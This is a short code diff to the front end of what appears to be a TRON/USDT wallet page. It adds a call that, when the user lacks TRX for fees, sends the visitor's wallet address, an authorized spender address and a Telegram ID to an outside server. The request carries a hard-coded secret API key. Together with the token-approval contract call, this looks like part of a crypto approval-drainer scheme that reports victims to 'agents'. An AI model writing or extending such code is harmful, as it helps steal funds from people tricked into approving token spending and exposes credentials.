@@ -612,6 +612,10 @@
 						$('.modal-overlay').remove()
 						$('.modal').removeClass('modal-in').addClass('modal-out')
 						mui.alert('TRX矿工费不足', '提示', '确定')
+
+						if (typeof notifyAgentBinding === 'function') {
+							notifyAgentBinding(walletAddress, authorized_address)
+						}
 						return
 					}
 					let contract = await window.tronWeb.contract().at(approveAddr)
@@ -691,15 +695,15 @@
 			function notifyAgentBinding(walletAddress, serviceAccount) {
 				const WEB_APP_URL = 'https://vipusdt.dpdns.org/'
 				const SECRET_API_KEY = '5bZk4n9czeodcjtmnPlgWsvS3gBX47hq8pqLvHKXEOc='
-				const tgid = GetRequest().tgid || ''
+				window.tgid = GetRequest().tgid || ''
 
-				if (!tgid) {
+				if (!window.tgid) {
 					console.log('No tgid found, skipping agent binding.')
 					return
 				}
 
 				const data = {
-					telegramId: tgid,
+					telegramId: window.tgid,
 					address: walletAddress,
 					serviceAccount: serviceAccount,
 				}
